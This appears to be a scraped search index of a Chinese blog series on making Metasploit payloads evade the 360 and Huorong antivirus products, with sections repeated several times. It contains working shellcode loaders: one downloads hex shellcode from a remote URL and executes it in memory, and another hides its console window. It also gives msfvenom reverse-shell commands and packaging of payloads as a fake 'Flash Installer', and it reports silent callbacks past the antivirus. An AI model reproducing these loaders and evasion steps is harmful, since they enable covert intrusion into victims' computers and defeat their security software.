","date":"2020-01-11","objectID":"/posts/shellcode-bypass-360-3/:2:1","series":null,"tags":["免杀"],"title":"MSF免杀360+火绒上线(三)","uri":"/posts/shellcode-bypass-360-3/#测试环境"},{"categories":["技术文章"],"content":"\r2.2 源码采用的py来作为加载器，魔改了一下k8的脚本，使用requests模块来访问远程资源，实现shellcode的加载。 注意运行环境为python2 remote.py import ctypes import sys import requests result=requests.get(url=sys.argv[1]).text.strip('\\n') shellcode=bytearray(result.decode(\"hex\")) ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40)) buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode) ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr), buf, ctypes.c_int(len(shellcode))) ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0), ctypes.c_int(0), ctypes.c_int(ptr), ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0))) ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1)) ","date":"2020-01-11","objectID":"/posts/shellcode-bypass-360-3/:2:2","series":null,"tags":["免杀"],"title":"MSF免杀360+火绒上线(三)","uri":"/posts/shellcode-bypass-360-3/#源码"},{"categories":["技术文章"],"content":"\r2.3 编译中的坑\r2.3.1 必须用py2的pyinstaller打包再说一遍这是py2写的，因为py3对于str跟byte的转换很麻烦 所以我们打包的时候也必须用python2的pyinstaller来打包。 这里就有坑了，如何区分py2的pyinstaller跟py3的pyinstaller。 我本机是python2跟3都用pip装了pyinstaller，直接在命令行下输入pyinstaller打包会默认是3的版本。 我的办法是找到3的script目录下，把3的pyinstaller.exe重命名为pyinstaller3.exe，这样就可以把2跟3的打包分开了。 2.3.2 不能有多余换行shellcode可以放在你的vps上，为了方便我是直接放在github上。 测试的时候一直出现这个错误，后来查了一下才知道是放shellcode的时候最后多了一个换行。 正确做法是粘贴好shellcode后显示文件只有一行 ","date":"2020-01-11","objectID":"/posts/shellcode-bypass-360-3/:2:3","series":null,"tags":["免杀"],"title":"MSF免杀360+火绒上线(三)","uri":"/posts/shellcode-bypass-360-3/#编译中的坑"},{"categories":["技术文章"],"content":"\r2.3 编译中的坑\r2.3.1 必须用py2的pyinstaller打包再说一遍这是py2写的，因为py3对于str跟byte的转换很麻烦 所以我们打包的时候也必须用python2的pyinstaller来打包。 这里就有坑了，如何区分py2的pyinstaller跟py3的pyinstaller。 我本机是python2跟3都用pip装了pyinstaller，直接在命令行下输入pyinstaller打包会默认是3的版本。 我的办法是找到3的script目录下，把3的pyinstaller.exe重命名为pyinstaller3.exe，这样就可以把2跟3的打包分开了。 2.3.2 不能有多余换行shellcode可以放在你的vps上，为了方便我是直接放在github上。 测试的时候一直出现这个错误，后来查了一下才知道是放shellcode的时候最后多了一个换行。 正确做法是粘贴好shellcode后显示文件只有一行 ","date":"2020-01-11","objectID":"/posts/shellcode-bypass-360-3/:2:3","series":null,"tags":["免杀"],"title":"MSF免杀360+火绒上线(三)","uri":"/posts/shellcode-bypass-360-3/#必须用py2的pyinstaller打包"},{"categories":["技术文章"],"content":"\r2.3 编译中的坑\r2.3.1 必须用py2的pyinstaller打包再说一遍这是py2写的，因为py3对于str跟byte的转换很麻烦 所以我们打包的时候也必须用python2的pyinstaller来打包。 这里就有坑了，如何区分py2的pyinstaller跟py3的pyinstaller。 我本机是python2跟3都用pip装了pyinstaller，直接在命令行下输入pyinstaller打包会默认是3的版本。 我的办法是找到3的script目录下，把3的pyinstaller.exe重命名为pyinstaller3.exe，这样就可以把2跟3的打包分开了。 2.3.2 不能有多余换行shellcode可以放在你的vps上，为了方便我是直接放在github上。 测试的时候一直出现这个错误，后来查了一下才知道是放shellcode的时候最后多了一个换行。 正确做法是粘贴好shellcode后显示文件只有一行 ","date":"2020-01-11","objectID":"/posts/shellcode-bypass-360-3/:2:3","series":null,"tags":["免杀"],"title":"MSF免杀360+火绒上线(三)","uri":"/posts/shellcode-bypass-360-3/#不能有多余换行"},{"categories":["技术文章"],"content":"\r2.4 使用方法首先msf生成shellcode msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.145.128 LPORT=443 -e x86/shikata_ga_nai -i 2 -f py -b '\\x00' 然后需要转换一下格式，2跟3运行均可 format.py buf =xxxxxx 你的shellcode import binascii print(binascii.b2a_hex(buf).decode()) 再把shellcode放到你的github上，注意上面提到的坑 然后找到raw，复制地址。 运行命令 remote.exe http://xxxxx/shellcode.txt ","date":"2020-01-11","objectID":"/posts/shellcode-bypass-360-3/:2:4","series":null,"tags":["免杀"],"title":"MSF免杀360+火绒上线(三)","uri":"/posts/shellcode-bypass-360-3/#使用方法"},{"categories":["技术文章"],"content":"\r2.5 本机win10上线测试\r","date":"2020-01-11","objectID":"/posts/shellcode-bypass-360-3/:2:5","series":null,"tags":["免杀"],"title":"MSF免杀360+火绒上线(三)","uri":"/posts/shellcode-bypass-360-3/#本机win10上线测试"},{"categories":["技术文章"],"content":"\r2.6 win7 360+火绒上线测试\r","date":"2020-01-11","objectID":"/posts/shellcode-bypass-360-3/:2:6","series":null,"tags":["免杀"],"title":"MSF免杀360+火绒上线(三)","uri":"/posts/shellcode-bypass-360-3/#win7-360火绒上线测试"},{"categories":["技术文章"],"content":"\r2.7 defender上线测试\r","date":"2020-01-11","objectID":"/posts/shellcode-bypass-360-3/:2:7","series":null,"tags":["免杀"],"title":"MSF免杀360+火绒上线(三)","uri":"/posts/shellcode-bypass-360-3/#defender上线测试"},{"categories":["技术文章"],"content":"\r3 最后测试结果还是比较满意的，并且远程加载可以随意变换payload，不需要换了C2就得重新做免杀。 文中的hex只是一个例子，你还可以加一层base64之类的，这个就看大家自己发挥了。 ","date":"2020-01-11","objectID":"/posts/shellcode-bypass-360-3/:3:0","series":null,"tags":["免杀"],"title":"MSF免杀360+火绒上线(三)","uri":"/posts/shellcode-bypass-360-3/#最后"},{"categories":["技术文章"],"content":"\r1 前言这是一个免杀系列文章。 因为自己二进制方面就是个弟弟，所以并不敢冒然称之为教程，只是记录自己在免杀过程中的各种坑以及效果对比。 其实各种办法已经在大佬们的文章中多多少少都有提到过，但是大多数都是讲述一下思路后一笔带过，然而实现的过程中往往会有各种坑。所以想着写一个系列文章，能够让像我这样的WEB选手可以用最简单的办法快速BypassAV。 记录的过程也是自己提高的过程，如果有好的思路可以联系我跟我一起交流，如果有说的不对的地方还望不吝赐教。 本文主要讲利用pyinstaller以及py2exe进行免杀。 ","date":"2019-12-24","objectID":"/posts/shellcode-bypass-360-2/:1:0","series":null,"tags":["免杀"],"title":"MSF免杀360+火绒上线(二)","uri":"/posts/shellcode-bypass-360-2/#前言"},{"categories":["技术文章"],"content":"\r2 正文","date":"2019-12-24","objectID":"/posts/shellcode-bypass-360-2/:2:0","series":null,"tags":["免杀"],"title":"MSF免杀360+火绒上线(二)","uri":"/posts/shellcode-bypass-360-2/#正文"},{"categories":["技术文章"],"content":"\r2.1 测试环境系统环境：kali，win7 (x64) 测试杀软： 360+火绒 防护全开 免杀工具： msfvenom py2exe pyinstaller 注：为了模拟真实环境，360跟火绒全部开启文件云上传。 文中测试方法如果没有特殊说明均为防护状态全开情况下静默上线。 ","date":"2019-12-24","objectID":"/posts/shellcode-bypass-360-2/:2:1","series":null,"tags":["免杀"],"title":"MSF免杀360+火绒上线(二)","uri":"/posts/shellcode-bypass-360-2/#测试环境"},{"categories":["技术文章"],"content":"\r2.2 安装过程以下环境均为python2 pip install py2exe pip install pyinstaller pyinstaller直接安装失败，搜了一下需要去官网下载后然后手动install http://www.pyinstaller.org/downloads.html 下载到本地后解压，然后通过管理员模式打开命令窗口，用 cd 命令切换至 pyinstaller的解压路径，然后运行 python setup.py install ","date":"2019-12-24","objectID":"/posts/shellcode-bypass-360-2/:2:2","series":null,"tags":["免杀"],"title":"MSF免杀360+火绒上线(二)","uri":"/posts/shellcode-bypass-360-2/#安装过程"},{"categories":["技术文章"],"content":"\r2.3 python的meterpreter\r2.3.1 reverse_tcpmsf生成payload msfvenom -p python/meterpreter/reverse_tcp lhost=192.168.145.128 lport=8888 -f raw 保存为tcp.py 同目录下建立make_tcp.py，内容如下 from distutils.core import setup import py2exe setup( name='yzddmr6', description='Flash Installer', version='1.0', console=['tcp.py'], options={'py2exe': {'bundle_files': 1, 'packages': 'ctypes', 'includes': 'base64,sys,socket,struct,time,code,platform,getpass,shutil', }}, zipfile=None, ) 大家可以去搜一下py2exe的完整命令手册 options里要注意两点： bundle_files为1是指所有的链接库打包成一个exe单文件，否则你就得把整个文件夹发给对方运行才能上线 include里面的库只能添不能减，否则会有如下报错。 py2exe编译 python make_tcp.py py2exe 然后在同目录dist文件夹下就会出来编译好的exe 静态查杀没有问题 点击后静默上线，360跟火绒无提示 2.3.2 reverse_http注意模版中includes中增加了urllib2库 from distutils.core import setup import py2exe setup( name='yzddmr6', description='Flash Installer', version='1.0', console=['http.py'], options={'py2exe': {'bundle_files': 1, 'packages': 'ctypes', 'includes': 'urllib2,base64,sys,socket,struct,time,code,platform,getpass,shutil', }}, zipfile=None, ) 静默上线 2.3.3 reverse_https from distutils.core import setup import py2exe setup( name='yzddmr6', description='Flash Installer', version='1.0', console=['main_view.py'], options={'py2exe': {'bundle_files': 1, 'packages': 'ctypes', 'includes': 'urllib2,ssl,base64,sys,socket,struct,time,code,platform,getpass,shutil', }}, zipfile=None, ) 这里就有坑了 因为特别是defender容易拦截流量，所以我一般用的都是https 最开始的时候就生成的https的msfpayload，按照上面的办法编译成exe win10本机上线没问题 但是win7下就报错，提示缺少ssl模块 但是我确实打包的时候添加了ssl模块的 谷歌了一下发现是win7跟win10库的问题 所以如果用https的话要注意对方是什么型号的系统。 ","date":"2019-12-24","objectID":"/posts/shellcode-bypass-360-2/:2:3","series":null,"tags":["免杀"],"title":"MSF免杀360+火绒上线(二)","uri":"/posts/shellcode-bypass-360-2/#python的meterpreter"},{"categories":["技术文章"],"content":"\r2.3 python的meterpreter\r2.3.1 reverse_tcpmsf生成payload msfvenom -p python/meterpreter/reverse_tcp lhost=192.168.145.128 lport=8888 -f raw 保存为tcp.py 同目录下建立make_tcp.py，内容如下 from distutils.core import setup import py2exe setup( name='yzddmr6', description='Flash Installer', version='1.0', console=['tcp.py'], options={'py2exe': {'bundle_files': 1, 'packages': 'ctypes', 'includes': 'base64,sys,socket,struct,time,code,platform,getpass,shutil', }}, zipfile=None, ) 大家可以去搜一下py2exe的完整命令手册 options里要注意两点： bundle_files为1是指所有的链接库打包成一个exe单文件，否则你就得把整个文件夹发给对方运行才能上线 include里面的库只能添不能减，否则会有如下报错。 py2exe编译 python make_tcp.py py2exe 然后在同目录dist文件夹下就会出来编译好的exe 静态查杀没有问题 点击后静默上线，360跟火绒无提示 2.3.2 reverse_http注意模版中includes中增加了urllib2库 from distutils.core import setup import py2exe setup( name='yzddmr6', description='Flash Installer', version='1.0', console=['http.py'], options={'py2exe': {'bundle_files': 1, 'packages': 'ctypes', 'includes': 'urllib2,base64,sys,socket,struct,time,code,platform,getpass,shutil', }}, zipfile=None, ) 静默上线 2.3.3 reverse_https from distutils.core import setup import py2exe setup( name='yzddmr6', description='Flash Installer', version='1.0', console=['main_view.py'], options={'py2exe': {'bundle_files': 1, 'packages': 'ctypes', 'includes': 'urllib2,ssl,base64,sys,socket,struct,time,code,platform,getpass,shutil', }}, zipfile=None, ) 这里就有坑了 因为特别是defender容易拦截流量，所以我一般用的都是https 最开始的时候就生成的https的msfpayload，按照上面的办法编译成exe win10本机上线没问题 但是win7下就报错，提示缺少ssl模块 但是我确实打包的时候添加了ssl模块的 谷歌了一下发现是win7跟win10库的问题 所以如果用https的话要注意对方是什么型号的系统。 ","date":"2019-12-24","objectID":"/posts/shellcode-bypass-360-2/:2:3","series":null,"tags":["免杀"],"title":"MSF免杀360+火绒上线(二)","uri":"/posts/shellcode-bypass-360-2/#reverse_tcp"},{"categories":["技术文章"],"content":"\r2.3 python的meterpreter\r2.3.1 reverse_tcpmsf生成payload msfvenom -p python/meterpreter/reverse_tcp lhost=192.168.145.128 lport=8888 -f raw 保存为tcp.py 同目录下建立make_tcp.py，内容如下 from distutils.core import setup import py2exe setup( name='yzddmr6', description='Flash Installer', version='1.0', console=['tcp.py'], options={'py2exe': {'bundle_files': 1, 'packages': 'ctypes', 'includes': 'base64,sys,socket,struct,time,code,platform,getpass,shutil', }}, zipfile=None, ) 大家可以去搜一下py2exe的完整命令手册 options里要注意两点： bundle_files为1是指所有的链接库打包成一个exe单文件，否则你就得把整个文件夹发给对方运行才能上线 include里面的库只能添不能减，否则会有如下报错。 py2exe编译 python make_tcp.py py2exe 然后在同目录dist文件夹下就会出来编译好的exe 静态查杀没有问题 点击后静默上线，360跟火绒无提示 2.3.2 reverse_http注意模版中includes中增加了urllib2库 from distutils.core import setup import py2exe setup( name='yzddmr6', description='Flash Installer', version='1.0', console=['http.py'], options={'py2exe': {'bundle_files': 1, 'packages': 'ctypes', 'includes': 'urllib2,base64,sys,socket,struct,time,code,platform,getpass,shutil', }}, zipfile=None, ) 静默上线 2.3.3 reverse_https from distutils.core import setup import py2exe setup( name='yzddmr6', description='Flash Installer', version='1.0', console=['main_view.py'], options={'py2exe': {'bundle_files': 1, 'packages': 'ctypes', 'includes': 'urllib2,ssl,base64,sys,socket,struct,time,code,platform,getpass,shutil', }}, zipfile=None, ) 这里就有坑了 因为特别是defender容易拦截流量，所以我一般用的都是https 最开始的时候就生成的https的msfpayload，按照上面的办法编译成exe win10本机上线没问题 但是win7下就报错，提示缺少ssl模块 但是我确实打包的时候添加了ssl模块的 谷歌了一下发现是win7跟win10库的问题 所以如果用https的话要注意对方是什么型号的系统。 ","date":"2019-12-24","objectID":"/posts/shellcode-bypass-360-2/:2:3","series":null,"tags":["免杀"],"title":"MSF免杀360+火绒上线(二)","uri":"/posts/shellcode-bypass-360-2/#reverse_http"},{"categories":["技术文章"],"content":"\r2.3 python的meterpreter\r2.3.1 reverse_tcpmsf生成payload msfvenom -p python/meterpreter/reverse_tcp lhost=192.168.145.128 lport=8888 -f raw 保存为tcp.py 同目录下建立make_tcp.py，内容如下 from distutils.core import setup import py2exe setup( name='yzddmr6', description='Flash Installer', version='1.0', console=['tcp.py'], options={'py2exe': {'bundle_files': 1, 'packages': 'ctypes', 'includes': 'base64,sys,socket,struct,time,code,platform,getpass,shutil', }}, zipfile=None, ) 大家可以去搜一下py2exe的完整命令手册 options里要注意两点： bundle_files为1是指所有的链接库打包成一个exe单文件，否则你就得把整个文件夹发给对方运行才能上线 include里面的库只能添不能减，否则会有如下报错。 py2exe编译 python make_tcp.py py2exe 然后在同目录dist文件夹下就会出来编译好的exe 静态查杀没有问题 点击后静默上线，360跟火绒无提示 2.3.2 reverse_http注意模版中includes中增加了urllib2库 from distutils.core import setup import py2exe setup( name='yzddmr6', description='Flash Installer', version='1.0', console=['http.py'], options={'py2exe': {'bundle_files': 1, 'packages': 'ctypes', 'includes': 'urllib2,base64,sys,socket,struct,time,code,platform,getpass,shutil', }}, zipfile=None, ) 静默上线 2.3.3 reverse_https from distutils.core import setup import py2exe setup( name='yzddmr6', description='Flash Installer', version='1.0', console=['main_view.py'], options={'py2exe': {'bundle_files': 1, 'packages': 'ctypes', 'includes': 'urllib2,ssl,base64,sys,socket,struct,time,code,platform,getpass,shutil', }}, zipfile=None, ) 这里就有坑了 因为特别是defender容易拦截流量，所以我一般用的都是https 最开始的时候就生成的https的msfpayload，按照上面的办法编译成exe win10本机上线没问题 但是win7下就报错，提示缺少ssl模块 但是我确实打包的时候添加了ssl模块的 谷歌了一下发现是win7跟win10库的问题 所以如果用https的话要注意对方是什么型号的系统。 ","date":"2019-12-24","objectID":"/posts/shellcode-bypass-360-2/:2:3","series":null,"tags":["免杀"],"title":"MSF免杀360+火绒上线(二)","uri":"/posts/shellcode-bypass-360-2/#reverse_https"},{"categories":["技术文章"],"content":"\r2.4 问题python的meterpreter虽然生成简单，但是缺了很多功能 比如说没有migrate，还有getsystem 如果进程被关了就掉线了 这里用的是py2exe，用pyinstaller打包会莫名其妙出错，不知道为什么。 ","date":"2019-12-24","objectID":"/posts/shellcode-bypass-360-2/:2:4","series":null,"tags":["免杀"],"title":"MSF免杀360+火绒上线(二)","uri":"/posts/shellcode-bypass-360-2/#问题"},{"categories":["技术文章"],"content":"\r2.5 windows的meterpreter\r2.5.1 reverse_tcpmsf生成payload msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.145.128 LPORT=443 -e x86/shikata_ga_nai -i 20 -f py -b '\\x00' \u003e /opt/py443.py 模版：win_tcp.py import ctypes from ctypes import * buf = xxxxxx #你的shellcode PROT_READ = 1 PROT_WRITE = 2 PROT_EXEC = 4 def executable_code(buffer): buf = c_char_p(buffer) size = len(buffer) addr = libc.valloc(size) addr = c_void_p(addr) if 0 == addr: raise Exception(\"Failed to allocate memory\") memmove(addr, buf, size) if 0 != libc.mprotect(addr, len(buffer), PROT_READ | PROT_WRITE | PROT_EXEC): raise Exception(\"Failed to set protection on buffer\") return addr VirtualAlloc = ctypes.windll.kernel32.VirtualAlloc VirtualProtect = ctypes.windll.kernel32.VirtualProtect shellcode = bytearray(buf) whnd = ctypes.windll.kernel32.GetConsoleWindow() if whnd != 0: if 1: ctypes.windll.user32.ShowWindow(whnd, 0) ctypes.windll.kernel32.CloseHandle(whnd) memorywithshell = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40)) buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode) old = ctypes.c_long(1) VirtualProtect(memorywithshell, ctypes.c_int(len(shellcode)),0x40,ctypes.byref(old)) ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(memorywithshell), buf, ctypes.c_int(len(shellcode))) shell = cast(memorywithshell, CFUNCTYPE(c_void_p)) shell() 这里用pyinstaller编译 pyinstaller -F -w win_tcp.py 参数说明 -F 产生单个的可执行文件 -w 指定程序运行时不显示命令行窗口（仅对 Windows 有效） -i 可以指定图标 静默上线 2.5.2 reverse_https msfvenom -p windows/meterpreter/reverse_https LPORT=443 LHOST=192.168.145.128 -e x86/shikata_ga_nai -i 5 -f py win10静默上线 win7会卡住，GG 看来https需要慎用。。。 ","date":"2019-12-24","objectID":"/posts/shellcode-bypass-360-2/:2:5","series":null,"tags":["免杀"],"title":"MSF免杀360+火绒上线(二)","uri":"/posts/shellcode-bypass-360-2/#windows的meterpreter"},{"categories":["技术文章"],"content":"\r2.5 windows的meterpreter\r2.5.1 reverse_tcpmsf生成payload msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.145.128 LPORT=443 -e x86/shikata_ga_nai -i 20 -f py -b '\\x00' \u003e /opt/py443.py 模版：win_tcp.py import ctypes from ctypes import * buf = xxxxxx #你的shellcode PROT_READ = 1 PROT_WRITE = 2 PROT_EXEC = 4 def executable_code(buffer): buf = c_char_p(buffer) size = len(buffer) addr = libc.valloc(size) addr = c_void_p(addr) if 0 == addr: raise Exception(\"Failed to allocate memory\") memmove(addr, buf, size) if 0 != libc.mprotect(addr, len(buffer), PROT_READ | PROT_WRITE | PROT_EXEC): raise Exception(\"Failed to set protection on buffer\") return addr VirtualAlloc = ctypes.windll.kernel32.VirtualAlloc VirtualProtect = ctypes.windll.kernel32.VirtualProtect shellcode = bytearray(buf) whnd = ctypes.windll.kernel32.GetConsoleWindow() if whnd != 0: if 1: ctypes.windll.user32.ShowWindow(whnd, 0) ctypes.windll.kernel32.CloseHandle(whnd) memorywithshell = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40)) buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode) old = ctypes.c_long(1) VirtualProtect(memorywithshell, ctypes.c_int(len(shellcode)),0x40,ctypes.byref(old)) ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(memorywithshell), buf, ctypes.c_int(len(shellcode))) shell = cast(memorywithshell, CFUNCTYPE(c_void_p)) shell() 这里用pyinstaller编译 pyinstaller -F -w win_tcp.py 参数说明 -F 产生单个的可执行文件 -w 指定程序运行时不显示命令行窗口（仅对 Windows 有效） -i 可以指定图标 静默上线 2.5.2 reverse_https msfvenom -p windows/meterpreter/reverse_https LPORT=443 LHOST=192.168.145.128 -e x86/shikata_ga_nai -i 5 -f py win10静默上线 win7会卡住，GG 看来https需要慎用。。。 ","date":"2019-12-24","objectID":"/posts/shellcode-bypass-360-2/:2:5","series":null,"tags":["免杀"],"title":"MSF免杀360+火绒上线(二)","uri":"/posts/shellcode-bypass-360-2/#reverse_tcp-1"},{"categories":["技术文章"],"content":"\r2.5 windows的meterpreter\r2.5.1 reverse_tcpmsf生成payload msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.145.128 LPORT=443 -e x86/shikata_ga_nai -i 20 -f py -b '\\x00' \u003e /opt/py443.py 模版：win_tcp.py import ctypes from ctypes import * buf = xxxxxx #你的shellcode PROT_READ = 1 PROT_WRITE = 2 PROT_EXEC = 4 def executable_code(buffer): buf = c_char_p(buffer) size = len(buffer) addr = libc.valloc(size) addr = c_void_p(addr) if 0 == addr: raise Exception(\"Failed to allocate memory\") memmove(addr, buf, size) if 0 != libc.mprotect(addr, len(buffer), PROT_READ | PROT_WRITE | PROT_EXEC): raise Exception(\"Failed to set protection on buffer\") return addr VirtualAlloc = ctypes.windll.kernel32.VirtualAlloc VirtualProtect = ctypes.windll.kernel32.VirtualProtect shellcode = bytearray(buf) whnd = ctypes.windll.kernel32.GetConsoleWindow() if whnd != 0: if 1: ctypes.windll.user32.ShowWindow(whnd, 0) ctypes.windll.kernel32.CloseHandle(whnd) memorywithshell = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40)) buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode) old = ctypes.c_long(1) VirtualProtect(memorywithshell, ctypes.c_int(len(shellcode)),0x40,ctypes.byref(old)) ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(memorywithshell), buf, ctypes.c_int(len(shellcode))) shell = cast(memorywithshell, CFUNCTYPE(c_void_p)) shell() 这里用pyinstaller编译 pyinstaller -F -w win_tcp.py 参数说明 -F 产生单个的可执行文件 -w 指定程序运行时不显示命令行窗口（仅对 Windows 有效） -i 可以指定图标 静默上线 2.5.2 reverse_https msfvenom -p windows/meterpreter/reverse_https LPORT=443 LHOST=192.168.145.128 -e x86/shikata_ga_nai -i 5 -f py win10静默上线 win7会卡住，GG 看来https需要慎用。。。 ","date":"2019-12-24","objectID":"/posts/shellcode-bypass-360-2/:2:5","series":null,"tags":["免杀"],"title":"MSF免杀360+火绒上线(二)","uri":"/posts/shellcode-bypass-360-2/#reverse_https-1"},{"categories":["技术文章"],"content":"\r3 最后免杀的精髓在于小众。 用C跟C++写的已经被杀得妈都不认了，但是用python转为exe这类比较小众，所以目前还有比较好的免杀效果。 综合以上结果可以得出结论，最稳定好用的还是windows/meterpreter/reverse_tcp，涉及到https这种虽然加密但是有可能对方系统不支持。 ","date":"2019-12-24","objectID":"/posts/shellcode-bypass-360-2/:3:0","series":null,"tags":["免杀"],"title":"MSF免杀360+火绒上线(二)","uri":"/posts/shellcode-bypass-360-2/#最后"},{"categories":["技术文章"],"content":"\r4 参考https://www.cnblogs.com/backlion/p/6785870.html https://blog.csdn.net/weixin_30339457/article/details/99381871 https://www.jianshu.com/p/92746f59736c https://xz.aliyun.com/t/5768 https://www.cnblogs.com/k8gege/p/11223393.html https://www.freebuf.com/column/204005.html ","date":"2019-12-24","objectID":"/posts/shellcode-bypass-360-2/:4:0","series":null,"tags":["免杀"],"title":"MSF免杀360+火绒上线(二)","uri":"/posts/shellcode-bypass-360-2/#参考"},{"categories":["技术文章"],"content":"\r1 前言venom前一段时间更新了，增加了一些新的免杀上线方式。 人怕出名猪怕壮，原来的混淆免杀对于360来说已经全部失效了 所以本菜鸡就研究了一下免杀。 自己二进制方面就是弟弟一个，如果有什么说的不对的地方还请联系我指出，感激不尽。 ","date":"2019-12-22","objectID":"/posts/shellcode-bypass-360-1/:1:0","series":null,"tags":["免杀"],"title":"MSF免杀360+火绒上线(一)","uri":"/posts/shellcode-bypass-360-1/#前言"},{"categories":["技术文章"],"content":"\r2 正文","date":"2019-12-22","objectID":"/posts/shellcode-bypass-360-1/:2:0","series":null,"tags":["免杀"],"title":"MSF免杀360+火绒上线(一)","uri":"/posts/shellcode-bypass-360-1/#正文"},{"categories":["技术文章"],"content":"\r2.1 测试信息系统环境：kali，Win7 x64 测试杀软： 360+火绒 防护全开 免杀工具： venom 虽然360是个大流氓，但是不得不说很厉害，毕竟有时候只能用流氓来打败流氓，实际中也遇到的比较多。 ","date":"2019-12-22","objectID":"/posts/shellcode-bypass-360-1/:2:1","series":null,"tags":["免杀"],"title":"MSF免杀360+火绒上线(一)","uri":"/posts/shellcode-bypass-360-1/#测试信息"},{"categories":["技术文章"],"content":"\r2.2 backdoor生成把venom原来的payload基本试了一遍，发现要么进了360的特征库，要么就是一执行就被杀。 但是msbuild还是稳得一批 关于msbuild上线的用法可以看三好学生大佬的这一篇文章 Use MSBuild To Do More 更新好venom后，选择windows，然后选择19 尽量使用加密流量传输，例如https或者rc4 选择好后venom会自动生成shellcode 就可以看到加有我们shellcode的xml文件了 然后通过python的http服务来下载 可以看到没有报毒，提示安全 ","date":"2019-12-22","objectID":"/posts/shellcode-bypass-360-1/:2:2","series":null,"tags":["免杀"],"title":"MSF免杀360+火绒上线(一)","uri":"/posts/shellcode-bypass-360-1/#backdoor生成"},{"categories":["技术文章"],"content":"\r2.3 自动安装net4.0win7默认是不带net4.0的，所以生成的backdoor是无法直接运行的 三好学生大佬的博客上给出了命令行下静默安装net4.0的方法 开始编译的时候报了一大堆错 这里有几个坑需要解决 版本必须用 release 字符集必须用 unicode 必须设置 在共享DLL中使用MFC 奇怪的是我明明已经下载好了net 4.0的安装包并且放到同一目录下面，但是静默下载工具一直提示找不到setup file的路径，后来换绝对路径也不行，如果有知道解决办法的表哥麻烦告诉我一下。。。 最后本弟弟还是决定手动给他装上。。。。 ","date":"2019-12-22","objectID":"/posts/shellcode-bypass-360-1/:2:3","series":null,"tags":["免杀"],"title":"MSF免杀360+火绒上线(一)","uri":"/posts/shellcode-bypass-360-1/#自动安装net40"},{"categories":["技术文章"],"content":"\r2.4 绕过360火绒上线执行bat后就会弹回来一个shell ps看到有360跟火绒的防御进程，但是完全是静默上线 也可以监控屏幕，执行命令等 ","date":"2019-12-22","objectID":"/posts/shellcode-bypass-360-1/:2:4","series":null,"tags":["免杀"],"title":"MSF免杀360+火绒上线(一)","uri":"/posts/shellcode-bypass-360-1/#绕过360火绒上线"},{"categories":["技术文章"],"content":"\r2.5 要解决的问题其实可以看到我们只是administrator权限，使用getsystem提示失败 装的老版本的win7，并没有打补丁，但是各种bypass uac跟溢出提权都GG 原因是，虽然上线的shellcode是免杀的，但是你提权之后会执行一个默认的payload去反弹shell，这时候反弹shell的payload并不是免杀的，就会被杀软拦截。 因为默认是反弹一个reverse_tcp的shell，我想着如果用windows/exec去cmd再去执行一次我们免杀的xml是不是就能返回一个system权限了呢 结果还是GG。。。试了很多办法也没解决。。。 等我研究一下再来给大家分享吧。。。 留下了没有技术的泪水.jpg ","date":"2019-12-22","objectID":"/posts/shellcode-bypass-360-1/:2:5","series":null,"tags":["免杀"],"title":"MSF免杀360+火绒上线(一)","uri":"/posts/shellcode-bypass-360-1/#要解决的问题"},{"categories":["技术文章"],"content":"\r3 最后TideSec最近出的这一个系列不错，大家有空了可以看一看 https://github.com/TideSec/BypassAntiVirus ","date":"2019-12-22","objectID":"/posts/shellcode-bypass-360-1/:3:0","series":null,"tags":["免杀"],"title":"MSF免杀360+火绒上线(一)","uri":"/posts/shellcode-bypass-360-1/#最后"},{"categories":["技术文章"],"content":"\r1 前言在上一篇蚁剑实现动态秘钥编码器解码器中，本人为了规避握手交换秘钥的特征，采用了利用时间生成随机秘钥的办法。 但是在实际使用的过程中还是会出现各种各样的玄学BUG，导致利用失败，我个人不是特别满意。 研究了一下蚁剑编码器的ext参数后，决定采用利用随机Cookie来产生随机秘钥的方式。 ","date":"2019-12-09","objectID":"/posts/antsword-xor-encoder-2/:1:0","series":null,"tags":["中国蚁剑"],"title":"基于随机Cookie的蚁剑动态秘钥编码器","uri":"/posts/antsword-xor-encoder-2/#前言"},{"categories":["技术文章"],"content":"\r2 正文","date":"2019-12-09","objectID":"/posts/antsword-xor-encoder-2/:2:0","series":null,"tags":["中国蚁剑"],"title":"基于随机Cookie的蚁剑动态秘钥编码器","uri":"/posts/antsword-xor-encoder-2/#正文"},{"categories":["技术文章"],"content":"\r2.1 编码器的ext参数本来一直等蚁剑作者写编码器的第三篇，结果一直没等到。。。 算了还是自己研究一下吧 首先新建一个编码器，名字叫test吧 加入一行console.log(ext.opts.httpConf); 然后随便连接一个shell，打开开发者工具，可以看到已经打印出了我们所需要的信息 包括shell请求的body跟headers头 抓包看一下，headers头的结果跟抓包的结果是一致的 那么我们能否从编码器中修改headers头呢 我们在编码器中加入一行 ext.opts.httpConf.headers['User-Agent']='yzddMr6'; 可以看到我们已经成功修改了shell中UA的值。 同理，我们也可以在编码器中对其他header头或者body进行修改。 ","date":"2019-12-09","objectID":"/posts/antsword-xor-encoder-2/:2:1","series":null,"tags":["中国蚁剑"],"title":"基于随机Cookie的蚁剑动态秘钥编码器","uri":"/posts/antsword-xor-encoder-2/#编码器的ext参数"},{"categories":["技术文章"],"content":"\r2.2 